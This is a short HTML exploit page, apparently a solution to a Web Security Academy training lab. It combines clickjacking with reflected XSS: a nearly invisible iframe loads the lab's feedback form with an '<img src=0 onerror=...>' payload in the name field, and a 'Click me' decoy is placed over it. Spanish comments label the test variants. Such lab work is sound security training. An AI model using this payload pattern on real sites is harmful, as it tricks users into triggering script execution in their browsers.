
```html
<style>
    iframe{
        width: 500px;
        height: 900px;
        opacity: 0.01;
    }
    div{
        position: absolute;
        top: 800px;
        left: 90px;
    }
</style>
<div>Click me</div>
<iframe src="https://0a55006e04ed82bf81c41b3d00fa006e.web-security-academy.net/feedback?name=%3Cimg%20src=0%20onerror=print()%3E&email=markos@markos.com&subject=vale_si&message=probando"></iframe>

//Este es para probar el XSS
<iframe src="https://0a55006e04ed82bf81c41b3d00fa006e.web-security-academy.net/feedback?name=<img src=0 onerror=alert()>&email=markos@markos.com&subject=vale_si&message=probando"></iframe>
//Este es para probar el print hacia la victima
<iframe src="https://0a55006e04ed82bf81c41b3d00fa006e.web-security-academy.net/feedback?name=<img src=0 onerror=alert()>&email=markos@markos.com&subject=vale_si&message=probando"></iframe>

```